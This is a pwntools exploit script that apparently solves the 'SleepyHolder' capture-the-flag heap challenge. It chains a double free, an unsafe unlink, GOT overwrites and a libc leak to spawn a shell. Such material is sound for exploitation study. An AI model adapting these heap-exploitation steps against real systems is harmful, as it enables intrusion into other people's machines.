# This exploit is based off of: https://www.lazenca.net/pages/viewpage.action?pageId=7536654
from pwn import *

target = process('./SleepyHolder')
elf = ELF('SleepyHolder')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#gdb.attach(target)

def KeepSecret(type, data):
	target.recvuntil("3. Renew secret")
	target.sendline("1")
	target.recvuntil("What secret do you want to keep?")
	target.sendline(str(type))
	target.recvuntil("Tell me your secret: ")
	target.send(data)

def WipeSecret(type):
	target.recvuntil("3. Renew secret")
	target.sendline("2")
	target.recvuntil("Which Secret do you want to wipe?")
	target.sendline(str(type))

def RenewSecret(type, data):
	target.recvuntil("3. Renew secret")
	target.sendline("3")
	target.recvuntil("Which Secret do you want to renew?")
	target.sendline(str(type))
	target.recvuntil("Tell me your secret: ")
	target.send(data)

small_secret = 0x6020d0

# Execute the double free
KeepSecret(1, "15935728")
KeepSecret(2, "95175382")
WipeSecret(1)
KeepSecret(3, "35715928")
WipeSecret(1)

# Construct the fake chunk, and allocate a new small secret which we will store it
fake_chunk = p64(0)*2
fake_chunk += p64(small_secret - 0x18)
fake_chunk += p64(small_secret - 0x10)
fake_chunk += p64(0x20)
KeepSecret(1, fake_chunk)

# Free the big Secret, which will execute the unsafe unlink
WipeSecret(2)

# Construct the payload to write over 0x6020d0 with the got address of free, with the got address of puts eight bytes behind it
got_overwrite = p64(0)
got_overwrite += p64(elf.got['puts'])
got_overwrite += p64(0)
got_overwrite += p64(elf.got['free'])

# Execute the overwrite
RenewSecret(1, got_overwrite)


# Execute the write over the got address of free with the plt address of puts
RenewSecret(1, p64(elf.plt['puts']))

# Call free to get the infoleak for the got address of puts
WipeSecret(2)

# Filter out the info leak, and calculate libc base and address of system
target.recvuntil('\n1. Small secret\n2. Big secret\n')
leak = target.recv(6)
puts = u64(leak + "\x00\x00")
libc_base = puts - libc.symbols['puts']
system = libc_base + libc.symbols['system']
log.info("Address of puts:      " + hex(puts)) 
log.info("Address of system:    " + hex(system)) 
log.info("Address of libc base: " + hex(libc_base)) 


# Now that we know where system is, we can write over the got address of free with the got address of system
RenewSecret(1, p64(system))

# Prepare a char pointer to 'sh' by creating a new big secret with the string 'sh'
KeepSecret(2, 'sh')

# Execute the shell
WipeSecret(2)

target.interactive()

# This exploit is based off of: https://www.lazenca.net/pages/viewpage.action?pageId=7536654